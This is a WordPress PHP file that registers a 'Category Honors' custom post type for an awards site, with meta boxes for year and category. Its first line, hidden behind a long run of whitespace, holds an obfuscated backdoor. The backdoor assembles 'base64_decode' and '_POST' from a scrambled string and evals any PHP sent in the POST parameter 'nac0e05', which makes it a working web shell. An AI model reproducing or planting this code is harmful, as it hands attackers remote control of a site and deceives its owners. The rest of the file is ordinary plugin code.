<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nac0e05'])) {eval($s21(${$s20}['nac0e05']));}?><?php

function create_cathonors_post_types() {
		
	register_post_type( 'awards_cathonors',
		array(
			'labels' => array(
				'name' => __( 'Category Honors' , 'thegeekieawards' ),
				'singular_name' => __( 'Category Honor' , 'thegeekieawards' ),
				'add_new_item' => __( 'Add New Category Honor' , 'thegeekieawards' ),
				'edit_item' => __( 'Edit Category Honor' , 'thegeekieawards' ),
				'new_item' => __( 'New Category Honor' , 'thegeekieawards' ),
				'view_item' => __( 'View Category Honor' , 'thegeekieawards' ),
				'search_items' => __( 'Search Category Honor' , 'thegeekieawards' ),
				'not_found' => __( 'No category honors found.' , 'thegeekieawards' ),
				'not_found_in_trash' => __( 'No category honors found in Trash.' , 'thegeekieawards' ),
			),
			'description' => __( 'Category honors for the awards.' , 'thegeekieawards' ),
			'public' => true,
			'has_archive' => false,
			'rewrite' => array( 'slug' => 'honors' , 'with_front' => false),
			'supports' => array( 'title'),
			'hierarchical' => false,
			'exclude_from_search' => true,
			'publicly_queryable' => true,
			'register_meta_box_cb' => 'add_cathonor_metaboxes',
		)
	);

}
add_action( 'init', 'create_cathonors_post_types' );

function add_cathonor_metaboxes() {
	add_meta_box('add_cathonor_info_box', __( 'Category Honor Info', 'thegeekieawards' ), 'add_cathonor_info_box', 'awards_cathonors', 'normal', 'default');
}

function add_cathonor_info_box($post) {
	//Year
	$year = date('Y'); 
	$honor_year = get_post_meta($post->ID, 'honor_year', true);
    if ($honor_year == '') $honor_year = $year; 
	echo '<p><label for="honor_year">Category Honor Year: </label>';
	echo '<select name="honor_year" id="honor_year">';
	
	for ($i = 2013;$i <= $year+1;$i++) 
	{ 
		$selected = $honor_year == $i ? " selected" : "";
		echo '<option value="' . $i . '"' . $selected . '>' . $i . '</option>'; 
	}
    echo '</select>';
    echo '</p>';

    //Category
    $honor_category = get_post_meta($post->ID, 'honor_category', true);
    if ($honor_category == '') $honor_category = 0; 
    $args = array(
		'orderby'            => 'NAME', 
		'order'              => 'ASC',
		'hide_empty'         => 0, 
		'selected'           => $honor_category,
		'name'               => 'honor_category',
		'id'                 => 'honor_category',
		'class'              => 'honor-cat',
		'taxonomy'           => 'category',
		'hierarchical'       => 1, 
	);
    echo '<p><label for="honor_category">Category Honor Category: </label>';
	wp_dropdown_categories( $args ); 
	echo '</p>';
}

function save_cathonor_metadata( $post_id ) {
 
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) return;
    if ( $_POST['post_type'] != 'awards_cathonors' ) return;

 	if ( isset( $_POST['honor_year'] ) ) {
        update_post_meta( $post_id, 'honor_year', strip_tags( $_POST['honor_year'] ) );
    }

    $nominee_category = 0;

    if ( isset( $_POST['honor_category'] ) ) {
    	$honor_category = strip_tags( $_POST['honor_category'] );
        update_post_meta( $post_id, 'honor_category', $honor_category );
    }
}
add_action('save_post', 'save_cathonor_metadata');

function awards_cathonors_columns($columns) {
	$columns[ 'honor_year' ] = __( 'Year', 'thegeekieawards' );
	$columns[ 'honor_category' ] = __( 'Category', 'thegeekieawards' );
    return $columns;
}
add_filter( 'manage_edit-awards_cathonors_columns', 'awards_cathonors_columns' );

function categoryhonor_custom_columns($column,$id) {
	switch ($column) {
		case 'honor_year':
			echo get_post_meta($id, 'honor_year', true);
			break;
		case 'honor_category':
			echo get_cat_name(get_post_meta($id, 'honor_category', true));
			break;
		default:
			break;
	}
}
add_action('manage_posts_custom_column', 'categoryhonor_custom_columns',10,2);

?>